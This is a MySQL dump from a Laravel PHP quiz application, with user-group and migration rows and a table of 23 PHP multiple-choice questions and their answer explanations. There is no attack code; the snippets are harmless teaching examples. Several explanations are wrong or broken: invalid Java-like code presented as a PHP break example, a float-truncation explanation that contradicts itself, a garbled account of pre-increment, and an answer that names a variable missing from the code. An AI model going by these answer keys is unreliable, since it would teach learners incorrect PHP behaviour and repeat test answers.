) ENGINE=InnoDB DEFAULT CHARSET=utf8;

LOCK TABLES `groups` WRITE;
/*!40000 ALTER TABLE `groups` DISABLE KEYS */;

INSERT INTO `groups` (`id`, `title`, `level`, `created_at`, `updated_at`)
VALUES
	(1,'admin',10,'0000-00-00 00:00:00','0000-00-00 00:00:00'),
	(2,'lectors',10,'0000-00-00 00:00:00','0000-00-00 00:00:00'),
	(3,'students',10,'0000-00-00 00:00:00','0000-00-00 00:00:00');

/*!40000 ALTER TABLE `groups` ENABLE KEYS */;
UNLOCK TABLES;


# Dump of table laravel_migrations
# ------------------------------------------------------------

DROP TABLE IF EXISTS `laravel_migrations`;

CREATE TABLE `laravel_migrations` (
  `bundle` varchar(50) NOT NULL,
  `name` varchar(200) NOT NULL,
  `batch` int(11) NOT NULL,
  PRIMARY KEY (`bundle`,`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

LOCK TABLES `laravel_migrations` WRITE;
/*!40000 ALTER TABLE `laravel_migrations` DISABLE KEYS */;

INSERT INTO `laravel_migrations` (`bundle`, `name`, `batch`)
VALUES
	('application','2012_01_03_164412_users_tables',1),
	('application','2012_11_11_163825_createbook',1),
	('application','2012_11_12_180305_question_croup_table',1),
	('application','2012_11_12_201221_answer',1),
	('application','2012_11_17_204017_create_tests_table',1);

/*!40000 ALTER TABLE `laravel_migrations` ENABLE KEYS */;
UNLOCK TABLES;


# Dump of table questions
# ------------------------------------------------------------

DROP TABLE IF EXISTS `questions`;

CREATE TABLE `questions` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `book_id` int(10) unsigned NOT NULL,
  `title` varchar(255) NOT NULL,
  `exerpt` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `explanation` text NOT NULL,
  `checkbox_answers` tinyint(1) NOT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

LOCK TABLES `questions` WRITE;
/*!40000 ALTER TABLE `questions` DISABLE KEYS */;

INSERT INTO `questions` (`id`, `book_id`, `title`, `exerpt`, `content`, `explanation`, `checkbox_answers`, `created_at`, `updated_at`)
VALUES
	(1,1,'Consider the following script:','','<div><span>Consider the&nbsp;</span><span>following</span><span>&nbsp;script:</span></div>\r\n<div><span><br /></span></div>\r\n<div>\r\n<title>This is a test script.</title>\r\n<pre><?php\r\n\r\n    echo \'This is some sample text\';\r\n\r\n?></pre></div>\r\n<div></div>\r\n<div><span>Which of the following tags is used in the php script?</span></div>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>In the above question, the standard php tag format is used, as shown below:</span></p>\r\n<p><pre><?php\r\n\r\n          /* Write your code here*/\r\n\r\n?></pre></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>There are four types of tags available in the php language as follows:</span><br /></span></p>\r\n<ol>\r\n<li><uc:hed>Standard Tags:&nbsp;</uc:hed>These tags are the standard php tags, which are certainly available and cannot be disabled by changing the php.conf file. The syntax of standard tags is as follows:<br /><br /><pre><?php\r\n\r\n      //code\r\n\r\n?></pre><br />&nbsp;</li>\r\n<li><uc:hed>Short Tags:&nbsp;</uc:hed><span><span>These tags are simple to use but can interfere with XML documents. The syntax of short tags is as follows:<br /><br /></span></span><pre><?\r\n      //code\r\n?></pre><span><span>or</span></span><pre><?= $variable ?></pre><span><br /><br /><span>(It can be used to print the result of an expression directly in the output of the script.)</span></span></li>\r\n<li><span><uc:hed>Script Tags:&nbsp;</uc:hed><span>These are simple HTML language tags. The syntax of script tags is as follows:<br /><br /><br />&nbsp;</span></span></li>\r\n<li><span><span><span><uc:hed>ASP Tags:&nbsp;</uc:hed><span>These are simple ASP tags. The syntax of ASP tags is as follows:</span><br /><br /><br /></span></span></span><pre><%\r\n      //code\r\n%></pre></li>\r\n</ol>\r\n<p><span><br /></span></p>',0,'2012-11-18 17:08:23','2012-11-18 20:15:54'),
	(2,1,'Which of the following equivalence operat...me value?','','<p><span>Which of the following equivalence operations evaluates to true if the two operands are not of the same data type or do not have the same value?</span></p>','<p><span><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The not-identical equivalence operation (</span><b>!==</b><span>) evaluates to true if the two operands are not of the same data type or do not have the same value.</span></span></p>\r\n<p><span>There are four types of equivalence operations in the PHP language:</span></p>\r\n<ul>\r\n<li><uc:hed>Equivalence Operation (==):&nbsp;</uc:hed>It evaluates to true if the two operands are equivalent, i.e., they can be converted to a common data type in which they have the same value but are not necessarily of the same type.</li>\r\n<li><uc:hed>Identity Operation (===):&nbsp;</uc:hed>It evaluates to true only if the operands are of the same data type and have the same value.</li>\r\n<li><uc:hed>Not-equivalent Operation (!=):&nbsp;</uc:hed>It evaluates to true if the two operands are not equivalent, without regards to their data type.</li>\r\n<li><uc:hed>Not-identical Operation (!==):&nbsp;</uc:hed>It evaluates to true if the two operands are not of the same data type or do not have the same value.</li>\r\n</ul>',0,'2012-11-18 17:33:51','2012-11-18 17:39:45'),
	(3,1,'Consider the following code:.....put of the above code?','','<p><span> Consider the following code: </span></p>\r\n<p><pre><?php \r\n\r\n$a=5; \r\n$b=12; \r\n$c=10; \r\n$d=7; \r\n$e=($a*$b)+$c*$d/$a; print($e); \r\n\r\n?></pre></p>\r\n<p><span> <span> What will be the output of the above code?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The output of the given code will be produced in the following steps:</span></p>\r\n<ol>\r\n<li>The value of a and b will be multiplied, i.e., ($a*$b)=60.</li>\r\n<li>The value of c and d will be multiplied, i.e., $c*$d=70.</li>\r\n<li>The product of c and d will be divided by a, i.e., 70/5=14.</li>\r\n<li>The quotient obtained will be added to the product of a and b, i.e., 14+60=74.</li>\r\n</ol>',0,'2012-11-18 17:36:45','2012-11-18 20:22:58'),
	(4,1,'Consider the following PHP script:.....put of the PHP script?','','<p><span>Consider the following PHP script:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span>\r\n<title>This is a test script.</title>\r\n</span></p>\r\n<p><pre><?php\r\n    echo (int) ((0.1 + 0.7) * 10);\r\n?></pre></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>What will be the output of the PHP script?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The expression ((0.1 + 0.7) * 10) should evaluate to 8. However, the output of the expression in the script evaluates to 7 because the PHP engine stores the value of the expression internally as 7.999999 instead of 7. When the fractional value is converted into an integer, the PHP engine simply truncates the fractional part. When the value is converted to int, PHP simply truncates away the fractional part, resulting in a rather significant error (12.5%, to be exact).</span></p>',0,'2012-11-18 17:38:53','2012-11-18 20:13:11'),
	(5,1,'Which of the following statements explain.....e between print() and echo()?','','<p><span>Which of the following statements explains the difference between print() and echo()?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>However, print () and echo() show same behavior most of the time, there is quite difference between them. print () is a language construct that behaves like a function with its own return value so you can use it as an expression. echo() is a language construct that has no return value so you cannot use it as an expression.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/function.echo.php\" tabindex=\"-1\">http://php.net/manual/en/function.echo.php</a></uc:ref></p>',0,'2012-11-18 17:41:17','2012-11-18 17:41:17'),
	(6,1,'In which of the following ways does the i.....rator === compare two values?','','<p><span>In which of the following ways does the identity operator === compare two values?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The identity operator first compares the type of both of its operands, and then it compares their values. If both the types and values are same, it returns true.</span></p>\r\n<p><span><span>There are four types of equivalence operations in the PHP language:</span></span></p>\r\n<ul>\r\n<li><uc:hed>Equivalence Operation (==):&nbsp;</uc:hed>It evaluates to true if the two operands are equivalent, i.e., they can be converted to a common data type in which they have the same value but are not necessarily of the same type.</li>\r\n<li><uc:hed>Identity Operation (===):&nbsp;</uc:hed>It evaluates to true only if the operands are of the same data type and have the same value.</li>\r\n<li><uc:hed>Not-equivalent Operation (!=):&nbsp;</uc:hed>It evaluates to true if the two operands are not equivalent, without regards to their data type.</li>\r\n<li><uc:hed>Not-identical Operation (!==):&nbsp;</uc:hed>It evaluates to true if the two operands are not of the same data type or do not have the same value.</li>\r\n</ul>\r\n<p><span><br /></span></p>',0,'2012-11-18 17:42:57','2012-11-18 17:42:57'),
	(7,1,'Which of the following data types are com.....ypes are compound data types?','','<p><span>Which of the following data types are compound data types?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options A and B are correct.</span><br /><br /><span>Arrays and objects are compound data types. Arrays are data types that contain ordered data elements. An array can be used to store and retrieve any other data type, such as numbers, Boolean values, strings, objects, and even other arrays. Objects are data types that contain both data and code.</span><br /><br /><span>Answer options C and D are incorrect. Booleans and strings are scalar data types. Booleans are data types that contain only two values:&nbsp;</span></p>\r\n<ul>\r\n<li><b>true</b></li>\r\n<li><b>false</b></li>\r\n</ul>\r\n<p><span>Strings are ordered collections of binary data, such as text, contents of an image file, spreadsheet, etc.</span></p>',0,'2012-11-18 17:44:36','2012-11-18 17:44:36'),
	(8,1,'What will be the output of the following .....); print_r($array);?>','','<p><span>What will be the output of the following PHP script:</span></p>\r\n<p><pre><?php\r\nfunction modifyArray (&$array) \r\n{\r\n    foreach ($array as &$value)\r\n    {\r\n         $value = $value + 2; \r\n    } \r\n    $value = $value + 3; \r\n } \r\n$array = array (1, 2, 3); \r\nmodifyArray($array); \r\nprint_r($array);\r\n?></pre></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.&nbsp;</span><br /><span>The foreach loop is used to iterate over the entire array from start to finish. There are two forms of the foreach loop, which are as follows:</span></p>\r\n<p><pre><?php\r\nforeach (array_expression as $value)\r\n{\r\n\r\n      //Statement;\r\n\r\n}\r\n?></pre></p>\r\n<p><span>or</span></p>\r\n<p><pre><?php\r\nforeach (array_expression as $key => $value)\r\n{\r\n\r\n      //Statement;\r\n\r\n}\r\n?></pre></p>\r\n<p><span><span>In the first form, foreach loop iterates over the array that is given by array_expression. On each iteration, the value of the current element is assigned to $value and the internal array pointer increases by one.</span><br /><br /><span>where, in the second form of the foreach loop, on each iteration, the value of the current element is assigned to $value. Also, the current element\'s key will be assigned to the variable $key on each iteration and the internal array pointer increases by one. The comments explain the working of the PHP script:</span></span></p>\r\n<p><pre><?php\r\nfunction modifyArray (&$array) \r\n{\r\n\r\n     foreach ($array as &$value) \r\n     {\r\n          $value = $value + 2; //Increment each value by 2  \r\n     } \r\n\r\n     $value = $value + 3; //It will increment only last value of the array\r\n\r\n}\r\n$array = array (1, 2, 3); \r\nmodifyArray($array); \r\nprint_r($array);\r\n?></pre></p>',0,'2012-11-18 17:48:27','2012-11-18 20:19:05'),
	(9,1,'Consider the following code:\r\n.....$i;\r\n    }\r\n    print($x);\r\n?>','','<p><span>Consider the following code:</span></p>\r\n<p><pre><?php\r\n    $x=0;\r\n    $i;\r\n    for($i=0;$i<5;$i++)\r\n    {\r\n        $x+=$i;\r\n    }\r\n    print($x);\r\n?></pre></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>The loop will run from 0 to 4. With each execution, the value of i will be incremented by one. The value will then be added and assigned to x. After the completion of the loop, the value of x will be 10.</span></p>',0,'2012-11-18 17:51:22','2012-11-18 20:27:24'),
	(10,1,'Consider the following code:.....output of the program?','','<p><span>Consider the following code:</span></p>\r\n<p><pre><?php\r\n\r\n    $a;\r\n    for($a=1;$a<=100;$a++)\r\n    {\r\n      if($a==50)\r\n      {\r\n        continue;\r\n      }\r\n      print($a);\r\n    }\r\n?></pre></p>\r\n<p><span><span>What will be the output of the program?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer optio</span><span>n B is correct.</span><br /><br /><span>In the given program, the continue statement forces the program to jump to a++. The value is incremented by one, and hence 51 is printed and 50 is skipped.</span></p>\r\n<p><span><span>The increment operator is a unary operator. Its sign is ++. It displays two different behaviors depending on the position of the operator. The two behaviors are as follows:</span><br /><br /></span></p>\r\n<ol>\r\n<li>x++</li>\r\n<li>++x</li>\r\n</ol>\r\n<p><span><span>Both of the above statements mean x=x+1. But when these are assigned to a variable, the meaning is changed. Let us see this in the following example:</span><br /><br /><span>Suppose the value of x=10, then in the statement b=++x, the value of variables x and b will be 11. It is so because b=++x contains two statements:</span><br /><br /></span></p>\r\n<ol>\r\n<li>b=x</li>\r\n<li>x=x+1</li>\r\n</ol>\r\n<p><span><span>Since the statement executes from left to right and the ++ operator has more priority than the = operator, first x will be incremented to one, and then its value will be assigned to b.</span><br /><br /><span>In case of the statement b=x++, the value of b will be 10 and the value of x will be 11 because b=x++ contains two statements.</span><br /><br /></span></p>\r\n<ol>\r\n<li>b=x</li>\r\n<li>x=x+1</li>\r\n</ol>\r\n<p><span><span>In this case, when the statement executes from left to right, it comes in contact with the variable x. The value of x is assigned to b and x is incremented to 1.</span><br /></span></p>',0,'2012-11-18 18:04:17','2012-11-18 20:20:18'),
	(11,1,'Mark works as a Web Application Developer..... and execute the code?','','<p><span>Mark works as a Web Application Developer for Blue Solutions Inc. He writes the following code:</span></p>\r\n<p><span><pre><?php\r\n    $x =25;\r\n    while($x<10)\r\n    {\r\n        $x--;\r\n    }\r\n    print ($x); \r\n?></pre></span></p>\r\n<p><span><span>What will be the output when Mark tries to compile and execute the code?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The while statement executes a block of statements when the condition is true. The while statement evaluates the expression which returns a boolean value. If the expression in the while block evaluates to true, the while statement executes the statements in the while block. The while statement keeps on executing the block until the expression evaluates to false. In the above code, the expression in the while statement evaluates to false and hence 25 is printed to the output.&nbsp;</span><br /><br /><span>The while loop is the most basic looping statement. It repeats a statement till its controlling expression is true. The general form of the while loop is as follows:</span></p>\r\n<p><span><pre><?php\r\n while (condition) {\r\n   //body of the loop\r\n }\r\n?></pre></span></p>\r\n<p><span><span>Here, the condition can be any Boolean expression. The body of the loop will execute till the condition is true. When the condition turns out to be false, control is transferred to the next line of the code after the while loop. Curly braces are not required if only a single statement is repeated.</span><br /><br /><span>The PHP compiler first checks the while conditional expression at the beginning of the while loop. Therefore, if the while condition is found false in the beginning itself, the body of the while loop will not be executed at all.</span><br /><br /><span>The body of a while loop can be empty. In PHP, a null statement (one that consists of only a semicolon) is valid.&nbsp;</span><br /><br /><span>Answer options A, C, and D are incorrect. The given code snippet will compile successfully and display 25 as output.</span></span></p>',0,'2012-11-18 20:33:20','2012-11-18 20:33:20'),
	(12,1,'Mark works as a Web Developer for Unicorn..... output of the script?','','<p><span>Mark works as a Web Developer for Unicorn Inc. He develops an application in PHP using the following code:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n      switch(1) {\r\n      case 1: print(\"Book Details<br>\"); \r\n      case 2: print(\"Book Author<br>\"); \r\n      default: print(\"Missing Book<br>\");\r\n      }\r\n?> </pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>What will be the output of the script?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>The given script will run successfully and will display all the three lines as output. The switch expression has the value 1; this is matched with the literal value specified in each case statement. The statement \"Book Details\" has the matching value, but since there is no break statement after this, all the statements after matching the literal value get executed.</span><br /><br /><span>If a break statement was given after case 1:, the statement \"Book Details\" would have been displayed.</span></p>',0,'2012-11-18 20:35:50','2012-11-18 20:35:50'),
	(13,1,'Fred works as a Web developer in Fastech .....o run this PHP script?','','<p><span>Fred works as a Web developer in Fastech Inc. He writes the following script:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n    $s = 2;\r\n    switch ($s) {\r\n      case 1:\r\n         print(\"Fred\");\r\n         break;\r\n      case 2:\r\n         print(\"Fast\");\r\n      case 3:\r\n         print(\"Tech\");\r\n      default: print(\"default\");\r\n    }\r\n?></pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>What will be displayed as output when Fred attempts to run this PHP script?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The break statement is used inside the code block following the switch statement to terminate the execution of a statement sequence. As soon as a break statement is encountered, the program control is transferred to the first line of code that follows the entire switch statement.</span><br /><br /><span>In the given program, the argument to the switch statement is an integer value 2. Therefore, the program control will be transferred at the matching case label, i.e., at line 7. As there is no break statement after line 6, the execution of the code will continue to fall through and all the statements after line 7 will be executed. Therefore, the execution of the program will display FastTechdefault as the output.</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>A break statement is used to abort the execution of a loop. It may be used with or without a label. When it is used without a label, it aborts the execution of the innermost switch, for, do, or while statement enclosing the break statement. When used with a label, the break statement aborts the execution of any enclosing statement matching the label.&nbsp;</span><br /><br /><b>Example:&nbsp;</b></span></p>\r\n<p><span><b><pre><?php\r\nclass Example\r\n{\r\n  public main(args) \r\n  {   \r\n    for(k=0;k<=20;k++)     \r\n    {           \r\n      if(k==10)          \r\n      {                \r\n        break;           \r\n      }            \r\n      print(\"Break loop :\".k);\r\n    }\r\n  }\r\n}\r\n?></pre></b></span></p>\r\n<p><span><b><b>Output:</b><br /><br /></b>Break loop :0<br />Break loop :1<br />Break loop :2<br />Break loop :3<br />Break loop :4<br />Break loop :5<br />Break loop :6<br />Break loop :7<br />Break loop :8<br />Break loop :9</span></p>',0,'2012-11-18 20:41:23','2012-11-18 20:41:23'),
	(14,1,'You work as a Web Developer for Remote In.....   print(\"false\");\r\n?> ','','<p><span>You work as a Web Developer for Remote Inc. What will be the output when you try to run the script below?</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n    $b = false;\r\n    if($b = true)\r\n      print(\"true\");\r\n    else\r\n      print(\"false\");\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The only legal expression in an if statement is a boolean expression or an expression that results in a boolean variable. In the above example, the value true is assigned to the variable x. The result of any assignment expression is the value of the variable following the assignment; hence, \"true\" will be the output.&nbsp;</span><br /><br /><span>The if-else statement is a conditional statement. It is used to execute a statement or group of statements based on some condition.&nbsp;</span><br /><br /><span>The general format of the statement is given below:</span></p>\r\n<p><span><pre><?php\r\nif(boolean_expression)\r\n{\r\n  statements;\r\n} else {\r\n  statements;\r\n}\r\n?></pre></span></p>\r\n<p><span><span>The else clause is optional.</span></span></p>\r\n<p><span><span><span>Answer options B, C, and D are incorrect. The given script runs successfully and displays true as output.</span></span></span></p>',0,'2012-11-18 20:44:28','2012-11-18 20:44:28'),
	(15,1,'You run the following PHP script:','','<p><span>You run the following PHP script:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\nfor($x = 1; $x <= 2; $x++){\r\n      for($y = 1; $y <= 3; $y++){\r\n         if ($x == $y) continue; \r\n         print(\"x = $x  y =  $y<br>\");\r\n      }\r\n   }\r\n?> </pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>What will be the output?</span><br /></span></p>\r\n<div class=\"factinstruction\">Each correct answer represents a complete solution. Choose all that apply.</div>\r\n<p><span><br /></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options B, C, D, and F are correct.</span><br /><br /><span>The first for loop initializes the variable x with the value 1 and continuously executes the code block following it till the value of x becomes 2.</span><br /><br /><span>For each of the values of x, the inner for loop initializes the variable y with the value 1, and continuously executes the code block following it till the value of y becomes 3. It also executes a continue statement whenever the values of x and y are the same. As a result of the execution of the continue statement, the statement at line number 5 is skipped and the program control is transferred at line number 3, i.e., the equal values of x and y will never be shown as output.</span><br /><br /><span>Answer options A and E are incorrect. The continue statement at line number 4 transfers the program control to the start of the inner for loop whenever the values of x and y are the same. Therefore, the statement at line number 5 will not execute to display equal values of x and y.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/control-structures.for.php\" tabindex=\"-1\">http://php.net/manual/en/control-structures.for.php</a></uc:ref></p>',0,'2012-11-18 20:47:36','2012-11-18 20:47:36'),
	(16,1,'You have been given a code snippet as fol.....o accomplish the task?','','<p><span>You have been given a code snippet as follows:</span></p>\r\n<p><span><br /></span></p>\r\n<p><pre><?php\r\n$somearray = array(\"hi\", \"this is a string\", \"this is a code\");\r\n?></pre></p>\r\n<p></p>\r\n<p><span><span>You want to iterate this array and modify the value of each of its elements. Which of the following ways will you use to accomplish the task?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>Generally, the for each loop is the most appropriate construct to iterate an array. As of PHP 5, it is possible to customize objects iteration too. Hence, the for each loop will be the most appropriate answer for this question.&nbsp;</span><br /><br /><span>Answer option A is incorrect. Since the array is sequentially indexed, the for loop will be the good choice to accomplish the task. However, it is not better than for each loop. For example:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n      $somearray = array(\"hi\", \"this is a string\", \"this is a code\"); \r\n      for( $i = 0; $i < count ($somearray); $i++ )\r\n      {\r\n            $somearray[$i] .= \"($i )\";\r\n      }\r\n?> </pre></span></p>\r\n<p><span><br /></span></p>\r\n<div class=\"clearfix\">Answer options B and C are incorrect. A while loop or a do while loop may also work. However, the array is sequentially indexed, the for loop will be the best choice to accomplish the task.</div>\r\n<p><span><br /></span></p>',0,'2012-11-18 20:51:31','2012-11-18 20:51:31'),
	(17,1,'Consider the following script:..... the operating system?','','<p><span>Consider the following script:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php \r\n      echo strtotime(\"january 1, 1901\"); \r\n?></pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>What will be the output of the above PHP script if the older versions of glibc are present in the operating system?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option D is correct.</span><br /><br /><span>In any operating system where older versions of glibc are present, the strtotime() function will not be able to identify dates prior to the UNIX period&nbsp;</span><b>midnight UTC on January 1, 1970</b><span>. Hence, the output of the script will be -1.</span></p>',0,'2012-11-18 20:53:18','2012-11-18 20:53:18'),
	(18,1,'John works as a Website Developer for PHP.....\n','','<p><span>John works as a Website Developer for PHPWEB Inc. He is using a Windows operating system and is also working on PHP engine 5.0. He develops the following script:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\n         echo date(\"M-d-Y\", mktime(0, 0, 0, 12, 32, 1965));\r\n?></pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>What will be the output of the above PHP script?</span></span></p>\r\n<p><span><span><br /></span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>According to the scenario, John is working on a Windows operating system and his PHP engine version is 5.0, which is prior to PHP version 5.1. Hence, the output of the script will be -1 with a warning message, and it will not display Jan-01-1966.</span></p>\r\n<p><span><span>The&nbsp;</span><b>mktime()</b><span>&nbsp;function is a timestamp function that is useful for date arithmetic and validation. It automatically calculates the correct value for an out-of-range input. The syntax of mktime() is as follows:</span></span></p>\r\n<p><span><span><span class=\"kwd\">int</span><span class=\"pln\"> mktime </span><span class=\"pun\">([</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $hour </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $minute </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $second </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $month </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $day </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $year </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $is_dst </span><span class=\"pun\">]]]]]]]</span><span class=\"pln\"> </span><span class=\"pun\">)</span></span></span></p>\r\n<p><span><span><span class=\"pun\"><uc:hed>Note:</uc:hed><span>&nbsp;The range of valid years in the mktime() function is limited to 1970 through 2038 before PHP 5.1.</span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><br /></span></span></span></span></p>',0,'2012-11-18 20:55:29','2012-11-18 20:55:29'),
	(19,1,'John works as a Web site Dev.....countries east of GMT?','','<p><span>J</span><span>ohn works as a Web site Developer for PHPWEB Inc. He uses the Windows operating system and works on PHP engine 5.0. He develops the following script:</span></p>\r\n<p><span><pre><?php\r\n    gmmktime(0, 0, 0, 1, 1, 1970); \r\n?></pre></span></p>\r\n<p><span><span>What will be the output of the above PHP script in case of countries east of GMT?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The gmmktime() function is valid only in GMT and best for Windows operating system users. Hence, the output -1 will be displayed.</span></p>\r\n<p><span><span>The gmmktime() function is a timestamp function that works in the same way as the mktime function, but the passed parameters of this function represents a GMT date. The syntax of gmmktime is as follows:</span></span></p>\r\n<p><span><span><span class=\"kwd\">int</span><span class=\"pln\"> gmmktime </span><span class=\"pun\">([</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $hour </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $minute </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $second </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $month </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $day </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $year </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $is_dst </span><span class=\"pun\">]]]]]]])</span></span></span></p>',0,'2012-11-18 20:59:14','2012-11-18 20:59:14'),
	(20,1,'Which of the following functions return t.....?\r\n','','<p><span>Which of the following functions return the timestamp value?</span></p>\r\n<p><span><br /></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options B and C are correct.</span><br /><br /><span>The strtotime() and time() functions return the timestamp value.</span><br /><br /><span>Answer options A and D are incorrect. The date() function returns a string, whereas the localtime() function returns an array.</span></p>',0,'2012-11-18 21:01:29','2012-11-18 21:01:29'),
	(21,1,'You run the following PHP script:','','<p><span>You run the following PHP script:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\nfunction calc()\r\n{\r\n    $x=10;\r\n    $b=++$x;\r\n    print($b);\r\n}\r\ncalc();\r\n?></pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>What will be the value of the variable b?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>The increment operator is a unary operator. Its sign is ++. It displays two different behaviors depending on the position of the operator. The two behaviors are as follows:</span><br /><br /></p>\r\n<ol>\r\n<li>x++</li>\r\n<li>++x</li>\r\n</ol>\r\n<p><span>Both of the above statements mean x=x+1. But when these are assigned to a variable, the meaning is changed. Let us see this in the following example:</span><br /><br /><span>Suppose the value of x=10, then in the statement b=++x, the value of variables x and b will be 11. It is so because b=++x contains two statements:</span><br /><br /></p>\r\n<ol>\r\n<li>b=x</li>\r\n<li>x=x+1</li>\r\n</ol>\r\n<p><span>Since the statement executes from left to right and the ++ operator has more priority than the = operator, first x will be incremented to one, and then its value will be assigned to b.</span><br /><br /><span>In case of the statement b=x++, the value of b will be 10 and the value of x will be 11 because b=x++ contains two statements.</span><br /><br /></p>\r\n<ol>\r\n<li>b=x</li>\r\n<li>x=x+1</li>\r\n</ol>\r\n<p><span>In this case, when the statement executes from left to right, it comes in contact with the variable x. The value of x is assigned to b and x is incremented to 1.</span></p>',0,'2012-11-18 21:02:46','2012-11-18 21:02:46'),
	(22,1,'Consider the following code:\r\n.....lue of the variable c?','','<p><span>Consider the following code:</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><pre><?php\r\nfunction modvalue()\r\n{\r\n       $a=20;\r\n       $b=4;\r\n       $c=$a%$b;\r\n       print($c);\r\n} \r\nmodvalue();\r\n?> </pre></span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>What will be the value of the variable c?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The value of the variable c will be 0. The modulus (%) operator is used to find out the remainder after a division has been completed. This can be used with integers and floating point numbers.</span><br /><br /><span>The following example will demonstrate the use of the modulus operator:</span></p>\r\n<p><span><pre><?php\r\n    $a=10;\r\n    $b=4;\r\n    $c= $a%$b;\r\n    print($c);\r\n?> </pre></span></p>\r\n<p><span><span>In the above program, the value of variable c will be 2.</span></span></p>',0,'2012-11-18 21:04:42','2012-11-18 21:04:42'),
	(23,1,'You run the following PHP script:','','<p><span>You run the following PHP script:</span></p>\r\n<p><span><br /></span></p>\r\n<p><pre><?php\r\n     echo 0x33, \' birds sit on \', 022, \' trees.\';\r\n?></pre></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<div class=\"clearfix\"><b>Explanation:</b>&nbsp;Answer option A is correct.<br /><br />The echo would convert the hexadecimal number 0x33 to 51, octal number 022 to 18, and output the string along with it.<br /><br />Answer options B, C, D and E are incorrect. The octal number 022 conversion is wrong.</div>',0,'2012-11-18 21:06:56','2012-11-18 21:08:21'),
